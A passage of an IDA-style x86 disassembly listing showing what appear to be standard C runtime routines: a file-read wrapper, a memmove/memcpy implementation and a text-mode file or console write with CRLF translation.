                call    sub_410921
                and     dword ptr [eax], 0
                call    sub_41090E
                mov     dword ptr [eax], 9

loc_41446F:                             ; CODE XREF: sub_414448+5C↓j
                or      eax, 0FFFFFFFFh
                jmp     loc_414535
; ---------------------------------------------------------------------------

loc_414477:                             ; CODE XREF: sub_414448+12↑j
                xor     esi, esi
                cmp     eax, esi
                jl      short loc_414485
                cmp     eax, uNumber
                jb      short loc_4144A6

loc_414485:                             ; CODE XREF: sub_414448+33↑j
                                        ; sub_414448+7C↓j
                call    sub_410921
                mov     [eax], esi
                call    sub_41090E
                mov     dword ptr [eax], 9

loc_414497:                             ; CODE XREF: sub_414448+9D↓j
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                call    sub_40EC54
                add     esp, 14h
                jmp     short loc_41446F
; ---------------------------------------------------------------------------

loc_4144A6:                             ; CODE XREF: sub_414448+3B↑j
                mov     ecx, eax
                sar     ecx, 5
                lea     ebx, dword_42CA00[ecx*4]
                mov     edi, eax
                and     edi, 1Fh
                shl     edi, 6
                mov     ecx, [ebx]
                movsx   ecx, byte ptr [ecx+edi+4]
                and     ecx, 1
                jz      short loc_414485
                mov     ecx, 7FFFFFFFh
                cmp     ecx, [ebp+nNumberOfBytesToRead]
                sbb     ecx, ecx
                inc     ecx
                jnz     short loc_4144E7
                call    sub_410921
                mov     [eax], esi
                call    sub_41090E
                mov     dword ptr [eax], 16h
                jmp     short loc_414497
; ---------------------------------------------------------------------------

loc_4144E7:                             ; CODE XREF: sub_414448+89↑j
                push    eax
                call    sub_4162DD
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], esi
                mov     eax, [ebx]
                test    byte ptr [eax+edi+4], 1
                jz      short loc_414510
                push    [ebp+nNumberOfBytesToRead] ; nNumberOfBytesToRead
                push    [ebp+lpBuffer]  ; lpBuffer
                push    [ebp+arg_0]     ; int
                call    sub_413E86
                add     esp, 0Ch
                mov     [ebp+var_1C], eax
                jmp     short loc_414526
; ---------------------------------------------------------------------------

loc_414510:                             ; CODE XREF: sub_414448+B0↑j
                call    sub_41090E
                mov     dword ptr [eax], 9
                call    sub_410921
                mov     [eax], esi
                or      [ebp+var_1C], 0FFFFFFFFh

loc_414526:                             ; CODE XREF: sub_414448+C6↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_41453B
; ---------------------------------------------------------------------------

loc_414532:                             ; CODE XREF: sub_414448+FC↓j
                mov     eax, [ebp+var_1C]

loc_414535:                             ; CODE XREF: sub_414448+2A↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_41453B:                             ; CODE XREF: sub_414448+E5↑j
                                        ; DATA XREF: .rdata:stru_422EB8↓o
                push    [ebp+arg_0]
                call    sub_41637D
                pop     ecx
                retn
sub_414448      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_414550      proc near               ; CODE XREF: sub_4012C0+1A9↑p
                                        ; sub_4015A0+2CA↑p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                push    ebp
                mov     ebp, esp
                push    edi
                push    esi
                mov     esi, [ebp+arg_4]
                mov     ecx, [ebp+arg_8]
                mov     edi, [ebp+arg_0]
                mov     eax, ecx
                mov     edx, ecx
                add     eax, esi
                cmp     edi, esi
                jbe     short loc_414570
                cmp     edi, eax
                jb      loc_414714

loc_414570:                             ; CODE XREF: sub_414550+16↑j
                cmp     ecx, 100h
                jb      short loc_414597
                cmp     dword_42C9EC, 0
                jz      short loc_414597
                push    edi
                push    esi
                and     edi, 0Fh
                and     esi, 0Fh
                cmp     edi, esi
                pop     esi
                pop     edi
                jnz     short loc_414597
                pop     esi
                pop     edi
                pop     ebp
                jmp     sub_4165C5
; ---------------------------------------------------------------------------

loc_414597:                             ; CODE XREF: sub_414550+26↑j
                                        ; sub_414550+2F↑j ...
                test    edi, 3
                jnz     short loc_4145B4
                shr     ecx, 2
                and     edx, 3
                cmp     ecx, 8          ; switch 8 cases
                jb      short loc_4145D4
                rep movsd               ; jumptable 004145D4 default case
                jmp     ds:off_4146C4[edx*4]
; ---------------------------------------------------------------------------
                align 4

loc_4145B4:                             ; CODE XREF: sub_414550+4D↑j
                mov     eax, edi
                mov     edx, 3
                sub     ecx, 4
                jb      short loc_4145CC
                and     eax, 3
                add     ecx, eax
                jmp     dword ptr ds:(loc_4145D4+4)[eax*4]
; ---------------------------------------------------------------------------

loc_4145CC:                             ; CODE XREF: sub_414550+6E↑j
                jmp     dword ptr ds:loc_4146D4[ecx*4]
; ---------------------------------------------------------------------------
                align 4

loc_4145D4:                             ; CODE XREF: sub_414550+58↑j
                                        ; sub_414550+B6↓j ...
                jmp     ds:off_414658[ecx*4] ; switch jump
; ---------------------------------------------------------------------------
                align 4
                dd offset loc_4145E8
                dd offset loc_414614
                dd offset loc_414638
; ---------------------------------------------------------------------------

loc_4145E8:                             ; DATA XREF: sub_414550+8C↑o
                and     edx, ecx
                mov     al, [esi]
                mov     [edi], al
                mov     al, [esi+1]
                mov     [edi+1], al
                mov     al, [esi+2]
                shr     ecx, 2
                mov     [edi+2], al
                add     esi, 3
                add     edi, 3
                cmp     ecx, 8
                jb      short loc_4145D4
                rep movsd
                jmp     ds:off_4146C4[edx*4]
; ---------------------------------------------------------------------------
                align 4

loc_414614:                             ; DATA XREF: sub_414550+90↑o
                and     edx, ecx
                mov     al, [esi]
                mov     [edi], al
                mov     al, [esi+1]
                shr     ecx, 2
                mov     [edi+1], al
                add     esi, 2
                add     edi, 2
                cmp     ecx, 8
                jb      short loc_4145D4
                rep movsd
                jmp     ds:off_4146C4[edx*4]
; ---------------------------------------------------------------------------
                align 4

loc_414638:                             ; DATA XREF: sub_414550+94↑o
                and     edx, ecx
                mov     al, [esi]
                mov     [edi], al
                add     esi, 1
                shr     ecx, 2
                add     edi, 1
                cmp     ecx, 8
                jb      short loc_4145D4
                rep movsd
                jmp     ds:off_4146C4[edx*4]
; ---------------------------------------------------------------------------
                align 4
off_414658      dd offset loc_4146BB    ; DATA XREF: sub_414550:loc_4145D4↑r
                dd offset loc_4146A8    ; jump table for switch statement
                dd offset loc_4146A0
                dd offset loc_414698
                dd offset loc_414690
                dd offset loc_414688
                dd offset loc_414680
                dd offset loc_414678
; ---------------------------------------------------------------------------

loc_414678:                             ; CODE XREF: sub_414550:loc_4145D4↑j
                                        ; DATA XREF: sub_414550:off_414658↑o
                mov     eax, [esi+ecx*4-1Ch] ; jumptable 004145D4 case 7
                mov     [edi+ecx*4-1Ch], eax

loc_414680:                             ; CODE XREF: sub_414550:loc_4145D4↑j
                                        ; DATA XREF: sub_414550:off_414658↑o
                mov     eax, [esi+ecx*4-18h] ; jumptable 004145D4 case 6
                mov     [edi+ecx*4-18h], eax

loc_414688:                             ; CODE XREF: sub_414550:loc_4145D4↑j
                                        ; DATA XREF: sub_414550:off_414658↑o
                mov     eax, [esi+ecx*4-14h] ; jumptable 004145D4 case 5
                mov     [edi+ecx*4-14h], eax

loc_414690:                             ; CODE XREF: sub_414550:loc_4145D4↑j
                                        ; DATA XREF: sub_414550:off_414658↑o
                mov     eax, [esi+ecx*4-10h] ; jumptable 004145D4 case 4
                mov     [edi+ecx*4-10h], eax

loc_414698:                             ; CODE XREF: sub_414550:loc_4145D4↑j
                                        ; DATA XREF: sub_414550:off_414658↑o
                mov     eax, [esi+ecx*4-0Ch] ; jumptable 004145D4 case 3
                mov     [edi+ecx*4-0Ch], eax

loc_4146A0:                             ; CODE XREF: sub_414550:loc_4145D4↑j
                                        ; DATA XREF: sub_414550:off_414658↑o
                mov     eax, [esi+ecx*4-8] ; jumptable 004145D4 case 2
                mov     [edi+ecx*4-8], eax

loc_4146A8:                             ; CODE XREF: sub_414550:loc_4145D4↑j
                                        ; DATA XREF: sub_414550:off_414658↑o
                mov     eax, [esi+ecx*4-4] ; jumptable 004145D4 case 1
                mov     [edi+ecx*4-4], eax
                lea     eax, ds:0[ecx*4]
                add     esi, eax
                add     edi, eax

loc_4146BB:                             ; CODE XREF: sub_414550:loc_4145D4↑j
                                        ; DATA XREF: sub_414550:off_414658↑o
                jmp     ds:off_4146C4[edx*4] ; jumptable 004145D4 case 0
; ---------------------------------------------------------------------------
                align 4
off_4146C4      dd offset loc_4146D4    ; DATA XREF: sub_414550+5C↑r
                                        ; sub_414550+BA↑r ...
                dd offset loc_4146DC
                dd offset loc_4146E8
                dd offset loc_4146FC
; ---------------------------------------------------------------------------

loc_4146D4:                             ; CODE XREF: sub_414550+5C↑j
                                        ; sub_414550+BA↑j ...
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     edi
                leave
                retn
; ---------------------------------------------------------------------------
                align 4

loc_4146DC:                             ; CODE XREF: sub_414550+5C↑j
                                        ; sub_414550+BA↑j ...
                mov     al, [esi]
                mov     [edi], al
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     edi
                leave
                retn
; ---------------------------------------------------------------------------
                align 4

loc_4146E8:                             ; CODE XREF: sub_414550+5C↑j
                                        ; sub_414550+BA↑j ...
                mov     al, [esi]
                mov     [edi], al
                mov     al, [esi+1]
                mov     [edi+1], al
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     edi
                leave
                retn
; ---------------------------------------------------------------------------
                align 4

loc_4146FC:                             ; CODE XREF: sub_414550+5C↑j
                                        ; sub_414550+BA↑j ...
                mov     al, [esi]
                mov     [edi], al
                mov     al, [esi+1]
                mov     [edi+1], al
                mov     al, [esi+2]
                mov     [edi+2], al
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     edi
                leave
                retn
; ---------------------------------------------------------------------------
                align 4

loc_414714:                             ; CODE XREF: sub_414550+1A↑j
                lea     esi, [ecx+esi-4]
                lea     edi, [ecx+edi-4]
                test    edi, 3
                jnz     short loc_414748
                shr     ecx, 2
                and     edx, 3
                cmp     ecx, 8
                jb      short loc_41473C
                std
                rep movsd
                cld
                jmp     ds:off_414860[edx*4] ; jumptable 00414760 case 0
; ---------------------------------------------------------------------------
                align 4

loc_41473C:                             ; CODE XREF: sub_414550+1DD↑j
                                        ; sub_414550+238↓j ...
                neg     ecx
                jmp     ds:off_414810[ecx*4]
; ---------------------------------------------------------------------------
                align 4

loc_414748:                             ; CODE XREF: sub_414550+1D2↑j
                mov     eax, edi
                mov     edx, 3
                cmp     ecx, 4          ; switch 4 cases
                jb      short loc_414760
                and     eax, 3          ; jumptable 00414760 default case
                sub     ecx, eax
                jmp     dword ptr ds:(loc_414760+4)[eax*4]
; ---------------------------------------------------------------------------

loc_414760:                             ; CODE XREF: sub_414550+202↑j
                                        ; DATA XREF: sub_414550+209↑r
                jmp     ds:off_414860[ecx*4] ; switch jump
; ---------------------------------------------------------------------------
                align 4
                dd offset loc_414774
                dd offset loc_414798
                dd offset loc_4147C0
; ---------------------------------------------------------------------------

loc_414774:                             ; DATA XREF: sub_414550+218↑o
                mov     al, [esi+3]
                and     edx, ecx
                mov     [edi+3], al
                sub     esi, 1
                shr     ecx, 2
                sub     edi, 1
                cmp     ecx, 8
                jb      short loc_41473C
                std
                rep movsd
                cld
                jmp     ds:off_414860[edx*4] ; jumptable 00414760 case 0
; ---------------------------------------------------------------------------
                align 4

loc_414798:                             ; DATA XREF: sub_414550+21C↑o
                mov     al, [esi+3]
                and     edx, ecx
                mov     [edi+3], al
                mov     al, [esi+2]
                shr     ecx, 2
                mov     [edi+2], al
                sub     esi, 2
                sub     edi, 2
                cmp     ecx, 8
                jb      short loc_41473C
                std
                rep movsd
                cld
                jmp     ds:off_414860[edx*4] ; jumptable 00414760 case 0
; ---------------------------------------------------------------------------
                align 10h

loc_4147C0:                             ; DATA XREF: sub_414550+220↑o
                mov     al, [esi+3]
                and     edx, ecx
                mov     [edi+3], al
                mov     al, [esi+2]
                mov     [edi+2], al
                mov     al, [esi+1]
                shr     ecx, 2
                mov     [edi+1], al
                sub     esi, 3
                sub     edi, 3
                cmp     ecx, 8
                jb      loc_41473C
                std
                rep movsd
                cld
                jmp     ds:off_414860[edx*4] ; jumptable 00414760 case 0
; ---------------------------------------------------------------------------
                align 4
                dd offset loc_414814
                dd offset loc_41481C
                dd offset loc_414824
                dd offset loc_41482C
                dd offset loc_414834
                dd offset loc_41483C
                dd offset loc_414844
off_414810      dd offset loc_414857    ; DATA XREF: sub_414550+1EE↑r
; ---------------------------------------------------------------------------

loc_414814:                             ; DATA XREF: sub_414550+2A4↑o
                mov     eax, [esi+ecx*4+1Ch]
                mov     [edi+ecx*4+1Ch], eax

loc_41481C:                             ; DATA XREF: sub_414550+2A8↑o
                mov     eax, [esi+ecx*4+18h]
                mov     [edi+ecx*4+18h], eax

loc_414824:                             ; DATA XREF: sub_414550+2AC↑o
                mov     eax, [esi+ecx*4+14h]
                mov     [edi+ecx*4+14h], eax

loc_41482C:                             ; DATA XREF: sub_414550+2B0↑o
                mov     eax, [esi+ecx*4+10h]
                mov     [edi+ecx*4+10h], eax

loc_414834:                             ; DATA XREF: sub_414550+2B4↑o
                mov     eax, [esi+ecx*4+0Ch]
                mov     [edi+ecx*4+0Ch], eax

loc_41483C:                             ; DATA XREF: sub_414550+2B8↑o
                mov     eax, [esi+ecx*4+8]
                mov     [edi+ecx*4+8], eax

loc_414844:                             ; DATA XREF: sub_414550+2BC↑o
                mov     eax, [esi+ecx*4+4]
                mov     [edi+ecx*4+4], eax
                lea     eax, ds:0[ecx*4]
                add     esi, eax
                add     edi, eax

loc_414857:                             ; CODE XREF: sub_414550+1EE↑j
                                        ; DATA XREF: sub_414550:off_414810↑o
                jmp     ds:off_414860[edx*4] ; jumptable 00414760 case 0
; ---------------------------------------------------------------------------
                align 10h
off_414860      dd offset loc_414870    ; DATA XREF: sub_414550+1E3↑r
                                        ; sub_414550:loc_414760↑r ...
                                        ; jump table for switch statement
                dd offset loc_414878    ; jumptable 00414760 case 1
                dd offset loc_414888    ; jumptable 00414760 case 2
                dd offset loc_41489C    ; jumptable 00414760 case 3
; ---------------------------------------------------------------------------

loc_414870:                             ; CODE XREF: sub_414550+1E3↑j
                                        ; sub_414550:loc_414760↑j ...
                mov     eax, [ebp+arg_0] ; jumptable 00414760 case 0
                pop     esi
                pop     edi
                leave
                retn
; ---------------------------------------------------------------------------
                align 4

loc_414878:                             ; CODE XREF: sub_414550+1E3↑j
                                        ; sub_414550:loc_414760↑j ...
                mov     al, [esi+3]     ; jumptable 00414760 case 1
                mov     [edi+3], al
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     edi
                leave
                retn
; ---------------------------------------------------------------------------
                align 4

loc_414888:                             ; CODE XREF: sub_414550+1E3↑j
                                        ; sub_414550:loc_414760↑j ...
                mov     al, [esi+3]     ; jumptable 00414760 case 2
                mov     [edi+3], al
                mov     al, [esi+2]
                mov     [edi+2], al
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     edi
                leave
                retn
; ---------------------------------------------------------------------------
                align 4

loc_41489C:                             ; CODE XREF: sub_414550+1E3↑j
                                        ; sub_414550:loc_414760↑j ...
                mov     al, [esi+3]     ; jumptable 00414760 case 3
                mov     [edi+3], al
                mov     al, [esi+2]
                mov     [edi+2], al
                mov     al, [esi+1]
                mov     [edi+1], al
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     edi
                leave
                retn
sub_414550      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_4148B5(int, int, DWORD nNumberOfBytesToWrite)
sub_4148B5      proc near               ; CODE XREF: sub_414FE8+9A↓p
                                        ; sub_41CC6C+BD↓p

Mode            = dword ptr -1AE4h
var_1AE0        = dword ptr -1AE0h
var_1AD9        = byte ptr -1AD9h
var_1AD8        = dword ptr -1AD8h
var_1AD4        = dword ptr -1AD4h
var_1AD0        = dword ptr -1AD0h
lpBuffer        = dword ptr -1ACCh
var_1AC8        = dword ptr -1AC8h
NumberOfBytesWritten= dword ptr -1AC4h
WideCharStr     = word ptr -1AC0h
var_1ABC        = dword ptr -1ABCh
Buffer          = byte ptr -1AB8h
var_1410        = byte ptr -1410h
var_6B8         = word ptr -6B8h
MultiByteStr    = byte ptr -0Ch
var_B           = byte ptr -0Bh
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
nNumberOfBytesToWrite= dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, 1AE4h
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_4]
                push    esi
                xor     esi, esi
                mov     [ebp+lpBuffer], eax
                mov     [ebp+var_1AC8], esi
                mov     [ebp+var_1AD0], esi
                cmp     [ebp+nNumberOfBytesToWrite], esi
                jnz     short loc_4148F2
                xor     eax, eax
                jmp     loc_414FDB
; ---------------------------------------------------------------------------

loc_4148F2:                             ; CODE XREF: sub_4148B5+34↑j
                cmp     eax, esi
                jnz     short loc_41491D
                call    sub_410921
                mov     [eax], esi
                call    sub_41090E
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                or      eax, 0FFFFFFFFh
                jmp     loc_414FDB
; ---------------------------------------------------------------------------

loc_41491D:                             ; CODE XREF: sub_4148B5+3F↑j
                push    ebx
                push    edi
                mov     edi, [ebp+arg_0]
                mov     eax, edi
                sar     eax, 5
                lea     esi, dword_42CA00[eax*4]
                mov     eax, [esi]
                and     edi, 1Fh
                shl     edi, 6
                add     eax, edi
                mov     bl, [eax+24h]
                add     bl, bl
                sar     bl, 1
                mov     [ebp+var_1AD8], esi
                mov     [ebp+var_1AD9], bl
                cmp     bl, 2
                jz      short loc_414955
                cmp     bl, 1
                jnz     short loc_414985

loc_414955:                             ; CODE XREF: sub_4148B5+99↑j
                mov     ecx, [ebp+nNumberOfBytesToWrite]
                not     ecx
                test    cl, 1
                jnz     short loc_414985
                call    sub_410921
                xor     esi, esi
                mov     [eax], esi
                call    sub_41090E
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                jmp     loc_414FC8
; ---------------------------------------------------------------------------

loc_414985:                             ; CODE XREF: sub_4148B5+9E↑j
                                        ; sub_4148B5+A8↑j
                test    byte ptr [eax+4], 20h
                jz      short loc_41499C
                push    2               ; dwMoveMethod
                push    0               ; int
                push    0               ; int
                push    [ebp+arg_0]     ; int
                call    sub_41892C
                add     esp, 10h

loc_41499C:                             ; CODE XREF: sub_4148B5+D4↑j
                push    [ebp+arg_0]
                call    sub_418B13
                pop     ecx
                test    eax, eax
                jz      loc_414C4A
                mov     eax, [esi]
                test    byte ptr [edi+eax+4], 80h
                jz      loc_414C4A
                call    sub_412405
                mov     eax, [eax+6Ch]
                xor     ecx, ecx
                cmp     [eax+14h], ecx
                lea     eax, [ebp+Mode]
                setz    cl
                push    eax             ; lpMode
                mov     eax, [esi]
                push    dword ptr [edi+eax] ; hConsoleHandle
                mov     [ebp+var_1AE0], ecx
                call    ds:GetConsoleMode
                test    eax, eax
                jz      loc_414C4A
                xor     ecx, ecx
                cmp     [ebp+var_1AE0], ecx
                jz      short loc_4149FC
                test    bl, bl
                jz      loc_414C4C

loc_4149FC:                             ; CODE XREF: sub_4148B5+13D↑j
                call    ds:GetConsoleCP
                mov     ebx, [ebp+lpBuffer]
                mov     [ebp+Mode], eax
                xor     eax, eax
                mov     [ebp+NumberOfBytesWritten], eax
                cmp     [ebp+nNumberOfBytesToWrite], eax
                jbe     loc_414F61
                mov     [ebp+var_1ABC], eax

loc_414A25:                             ; CODE XREF: sub_4148B5+371↓j
                mov     al, [ebp+var_1AD9]
                test    al, al
                jnz     loc_414B9A
                mov     cl, [ebx]
                mov     esi, [ebp+var_1AD8]
                xor     eax, eax
                cmp     cl, 0Ah
                setz    al
                mov     [ebp+var_1AE0], eax
                mov     eax, [esi]
                add     eax, edi
                cmp     dword ptr [eax+38h], 0
                jz      short loc_414A68
                mov     dl, [eax+34h]
                mov     [ebp+MultiByteStr], dl
                mov     [ebp+var_B], cl
                and     dword ptr [eax+38h], 0
                push    2
                lea     eax, [ebp+MultiByteStr]
                push    eax
                jmp     short loc_414AB3
; ---------------------------------------------------------------------------

loc_414A68:                             ; CODE XREF: sub_4148B5+19C↑j
                movsx   eax, cl
                push    eax
                call    sub_418D6F
                pop     ecx
                test    eax, eax
                jz      short loc_414AB0
                mov     ecx, [ebp+lpBuffer]
                sub     ecx, ebx
                add     ecx, [ebp+nNumberOfBytesToWrite]
                xor     eax, eax
                inc     eax
                cmp     ecx, eax
                jbe     loc_414C31
                push    2               ; int
                lea     eax, [ebp+WideCharStr]
                push    ebx             ; lpMultiByteStr
                push    eax             ; lpWideCharStr
                call    sub_41AD6F
                add     esp, 0Ch
                cmp     eax, 0FFFFFFFFh
                jz      loc_414F58
                inc     ebx
                inc     [ebp+var_1ABC]
                jmp     short loc_414ACB
; ---------------------------------------------------------------------------

loc_414AB0:                             ; CODE XREF: sub_4148B5+1BF↑j
                push    1               ; int
                push    ebx             ; lpMultiByteStr

loc_414AB3:                             ; CODE XREF: sub_4148B5+1B1↑j
                lea     eax, [ebp+WideCharStr]
                push    eax             ; lpWideCharStr
                call    sub_41AD6F
                add     esp, 0Ch
                cmp     eax, 0FFFFFFFFh
                jz      loc_414F58

loc_414ACB:                             ; CODE XREF: sub_4148B5+1F9↑j
                xor     eax, eax
                push    eax             ; lpUsedDefaultChar
                push    eax             ; lpDefaultChar
                push    5               ; cbMultiByte
                lea     ecx, [ebp+MultiByteStr]
                push    ecx             ; lpMultiByteStr
                push    1               ; cchWideChar
                lea     ecx, [ebp+WideCharStr]
                push    ecx             ; lpWideCharStr
                push    eax             ; dwFlags
                push    [ebp+Mode]      ; CodePage
                inc     ebx
                inc     [ebp+var_1ABC]
                call    ds:WideCharToMultiByte
                mov     esi, eax
                test    esi, esi
                jz      loc_414F58
                push    0               ; lpOverlapped
                lea     eax, [ebp+NumberOfBytesWritten]
                push    eax             ; lpNumberOfBytesWritten
                push    esi             ; nNumberOfBytesToWrite
                lea     eax, [ebp+MultiByteStr]
                push    eax             ; lpBuffer
                mov     eax, [ebp+var_1AD8]
                mov     eax, [eax]
                push    dword ptr [edi+eax] ; hFile
                call    ds:WriteFile
                test    eax, eax
                jz      loc_414F4C
                mov     eax, [ebp+var_1ABC]
                mov     ecx, [ebp+var_1AD0]
                add     eax, ecx
                cmp     [ebp+NumberOfBytesWritten], esi
                mov     [ebp+var_1AC8], eax
                jl      loc_414F58
                cmp     [ebp+var_1AE0], 0
                jz      loc_414C1D
                push    0               ; lpOverlapped
                lea     eax, [ebp+NumberOfBytesWritten]
                push    eax             ; lpNumberOfBytesWritten
                push    1               ; nNumberOfBytesToWrite
                lea     eax, [ebp+MultiByteStr]
                push    eax             ; lpBuffer
                mov     eax, [ebp+var_1AD8]
                mov     eax, [eax]
                mov     [ebp+MultiByteStr], 0Dh
                push    dword ptr [edi+eax] ; hFile
                call    ds:WriteFile
                test    eax, eax
                jz      loc_414F4C
                cmp     [ebp+NumberOfBytesWritten], 1
                jl      loc_414F58
                inc     [ebp+var_1AD0]
                inc     [ebp+var_1AC8]
                jmp     loc_414C1D
; ---------------------------------------------------------------------------

loc_414B9A:                             ; CODE XREF: sub_4148B5+178↑j
                cmp     al, 1
                jz      short loc_414BA2
                cmp     al, 2
                jnz     short loc_414BC3

loc_414BA2:                             ; CODE XREF: sub_4148B5+2E7↑j
                movzx   esi, word ptr [ebx]
                xor     ecx, ecx
                cmp     si, 0Ah
                setz    cl
                inc     ebx
                inc     ebx
                add     [ebp+var_1ABC], 2
                mov     dword ptr [ebp+WideCharStr], esi
                mov     [ebp+var_1AE0], ecx

loc_414BC3:                             ; CODE XREF: sub_4148B5+2EB↑j
                cmp     al, 1
                jz      short loc_414BCB
                cmp     al, 2
                jnz     short loc_414C1D

loc_414BCB:                             ; CODE XREF: sub_4148B5+310↑j
                push    dword ptr [ebp+WideCharStr] ; Buffer
                call    sub_41AB93
                pop     ecx
                cmp     ax, [ebp+WideCharStr]
                jnz     loc_414F4C
                add     [ebp+var_1AC8], 2
                cmp     [ebp+var_1AE0], 0
                jz      short loc_414C1D
                push    0Dh
                pop     eax
                push    eax             ; Buffer
                mov     dword ptr [ebp+WideCharStr], eax
                call    sub_41AB93
                pop     ecx
                cmp     ax, [ebp+WideCharStr]
                jnz     loc_414F4C
                inc     [ebp+var_1AC8]
                inc     [ebp+var_1AD0]

loc_414C1D:                             ; CODE XREF: sub_4148B5+295↑j
                                        ; sub_4148B5+2E0↑j ...
                mov     eax, [ebp+nNumberOfBytesToWrite]
                cmp     [ebp+var_1ABC], eax
                jb      loc_414A25
                jmp     loc_414F58
; ---------------------------------------------------------------------------

loc_414C31:                             ; CODE XREF: sub_4148B5+1D1↑j
                mov     ecx, [esi]
                mov     dl, [ebx]
                inc     [ebp+var_1AC8]
                mov     [edi+ecx+34h], dl
                mov     ecx, [esi]
                mov     [edi+ecx+38h], eax
                jmp     loc_414F58
; ---------------------------------------------------------------------------

loc_414C4A:                             ; CODE XREF: sub_4148B5+F2↑j
                                        ; sub_4148B5+FF↑j ...
                xor     ecx, ecx

loc_414C4C:                             ; CODE XREF: sub_4148B5+141↑j
                mov     eax, [esi]
                add     eax, edi
                test    byte ptr [eax+4], 80h
                jz      loc_414F19
                mov     eax, [ebp+lpBuffer]
                mov     dword ptr [ebp+WideCharStr], ecx
                test    bl, bl
                jnz     loc_414D38
                mov     [ebp+NumberOfBytesWritten], eax
                cmp     [ebp+nNumberOfBytesToWrite], ecx
                jbe     loc_414F9D
                jmp     short loc_414C85
; ---------------------------------------------------------------------------

loc_414C7F:                             ; CODE XREF: sub_4148B5+478↓j
                mov     esi, [ebp+var_1AD8]

loc_414C85:                             ; CODE XREF: sub_4148B5+3C8↑j
                mov     ecx, [ebp+NumberOfBytesWritten]
                and     [ebp+var_1ABC], 0
                sub     ecx, [ebp+lpBuffer]
                lea     eax, [ebp+Buffer]

loc_414C9E:                             ; CODE XREF: sub_4148B5+425↓j
                cmp     ecx, [ebp+nNumberOfBytesToWrite]
                jnb     short loc_414CDC
                mov     edx, [ebp+NumberOfBytesWritten]
                inc     [ebp+NumberOfBytesWritten]
                mov     dl, [edx]
                inc     ecx
                cmp     dl, 0Ah
                jnz     short loc_414CC7
                inc     [ebp+var_1AD0]
                mov     byte ptr [eax], 0Dh
                inc     eax
                inc     [ebp+var_1ABC]

loc_414CC7:                             ; CODE XREF: sub_4148B5+400↑j
                mov     [eax], dl
                inc     eax
                inc     [ebp+var_1ABC]
                cmp     [ebp+var_1ABC], 13FFh
                jb      short loc_414C9E

loc_414CDC:                             ; CODE XREF: sub_4148B5+3EC↑j
                mov     ebx, eax
                lea     eax, [ebp+Buffer]
                sub     ebx, eax
                push    0               ; lpOverlapped
                lea     eax, [ebp+var_1AD4]
                push    eax             ; lpNumberOfBytesWritten
                push    ebx             ; nNumberOfBytesToWrite
                lea     eax, [ebp+Buffer]
                push    eax             ; lpBuffer
                mov     eax, [esi]
                push    dword ptr [edi+eax] ; hFile
                call    ds:WriteFile
                test    eax, eax
                jz      loc_414F4C
                mov     eax, [ebp+var_1AD4]
                add     [ebp+var_1AC8], eax
                cmp     eax, ebx
                jl      loc_414F58
                mov     eax, [ebp+NumberOfBytesWritten]
                sub     eax, [ebp+lpBuffer]
                cmp     eax, [ebp+nNumberOfBytesToWrite]
                jb      loc_414C7F
                jmp     loc_414F58
; ---------------------------------------------------------------------------

loc_414D38:                             ; CODE XREF: sub_4148B5+3B3↑j
                mov     [ebp+var_1ABC], eax
                cmp     bl, 2
                jnz     loc_414E18
                cmp     [ebp+nNumberOfBytesToWrite], ecx
                jbe     loc_414F9D
                jmp     short loc_414D58
; ---------------------------------------------------------------------------

loc_414D52:                             ; CODE XREF: sub_4148B5+558↓j
                mov     esi, [ebp+var_1AD8]

loc_414D58:                             ; CODE XREF: sub_4148B5+49B↑j
                mov     ecx, [ebp+var_1ABC]
                and     [ebp+NumberOfBytesWritten], 0
                sub     ecx, [ebp+lpBuffer]
                lea     eax, [ebp+Buffer]

loc_414D71:                             ; CODE XREF: sub_4148B5+505↓j
                cmp     ecx, [ebp+nNumberOfBytesToWrite]
                jnb     short loc_414DBC
                mov     edx, [ebp+var_1ABC]
                add     [ebp+var_1ABC], 2
                movzx   edx, word ptr [edx]
                inc     ecx
                inc     ecx
                cmp     dx, 0Ah
                jnz     short loc_414DA4
                add     [ebp+var_1AD0], 2
                push    0Dh
                pop     ebx
                mov     [eax], bx
                inc     eax
                inc     eax
                add     [ebp+NumberOfBytesWritten], 2

loc_414DA4:                             ; CODE XREF: sub_4148B5+4D7↑j
                add     [ebp+NumberOfBytesWritten], 2
                mov     [eax], dx
                inc     eax
                inc     eax
                cmp     [ebp+NumberOfBytesWritten], 13FEh
                jb      short loc_414D71

loc_414DBC:                             ; CODE XREF: sub_4148B5+4BF↑j
                mov     ebx, eax
                lea     eax, [ebp+Buffer]
                sub     ebx, eax
                push    0               ; lpOverlapped
                lea     eax, [ebp+var_1AD4]
                push    eax             ; lpNumberOfBytesWritten
                push    ebx             ; nNumberOfBytesToWrite
                lea     eax, [ebp+Buffer]
                push    eax             ; lpBuffer
                mov     eax, [esi]
                push    dword ptr [edi+eax] ; hFile
                call    ds:WriteFile
                test    eax, eax
                jz      loc_414F4C
                mov     eax, [ebp+var_1AD4]
                add     [ebp+var_1AC8], eax
                cmp     eax, ebx
                jl      loc_414F58
                mov     eax, [ebp+var_1ABC]
                sub     eax, [ebp+lpBuffer]
                cmp     eax, [ebp+nNumberOfBytesToWrite]
                jb      loc_414D52
                jmp     loc_414F58
